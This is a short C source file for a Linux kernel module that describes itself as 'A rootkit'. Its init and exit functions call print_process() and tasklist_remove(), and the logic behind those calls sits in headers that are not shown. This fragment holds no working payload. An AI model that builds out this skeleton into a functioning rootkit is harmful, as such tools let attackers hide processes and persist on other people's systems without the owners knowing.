

#include <linux/kernel.h>
#include <linux/module.h>


#include "../include/config.h"
#include "../include/net.h"
#include "../include/proc.h"





static int __init my_init(void) { 
	
	print_process();
	return 0;
}

static void __exit my_exit(void) {

	tasklist_remove();
	printk(KERN_INFO "module removed\n");	
}


module_init(my_init);
module_exit(my_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("h00k86");
MODULE_DESCRIPTION("A rootkit ");
